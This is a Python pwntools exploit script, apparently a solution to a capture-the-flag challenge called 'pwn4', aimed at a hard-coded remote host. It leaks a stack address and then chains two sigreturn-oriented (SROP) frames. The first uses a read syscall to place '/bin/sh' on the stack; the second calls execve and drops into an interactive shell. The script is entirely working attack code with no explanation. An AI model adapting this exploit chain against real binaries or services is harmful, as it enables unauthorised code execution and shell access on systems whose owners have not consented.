#! python
from pwn import *
context.binary = './pwn4'
io = process('./pwn4')
io = remote('106.75.66.195', 11006)
#leak stack addr
payload = p64(0x4000b0)
payload += p64(0x4000b3)
payload += p64(0x4000b0)
io.sendline(payload)
io.send('\xb3')
sleep(2)
LeakMsg = io.recvn(0x400)
leak_addr = u64(LeakMsg[0x8:0x8+8])
log.info("leak_addr:"+hex(leak_addr))
stack_addr = leak_addr-0x500
log.info("stack_addr:"+hex(stack_addr))
binsh_addr = stack_addr+0x300
log.info("binsh_addr:"+hex(binsh_addr))
#write /bin/sh to stack
syscall_addr = 0x4000be
frame = SigreturnFrame()
frame.rax = constants.SYS_read
frame.rdi = 0
frame.rsi = stack_addr
frame.rdx = 0x400
frame.rsp = stack_addr
frame.rip = syscall_addr
payload1 = p64(0x4000b0)+p64(syscall_addr) #signturn
payload1 += str(frame)
io.sendline(payload1)
sleep(2)
io.send(payload1[0x8:0x8+15])
sleep(2)
#execve("/bin/sh")
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = binsh_addr
frame.rip = syscall_addr
payload2 = p64(0x4000b0)+p64(syscall_addr)
payload2 += str(frame)
payload2 += 'a' * (0x300-len(payload2)) + '/bin/sh\x00'
io.sendline(payload2)
sleep(2)
io.send(payload2[0x8:0x8+15])
sleep(2)
io.interactive()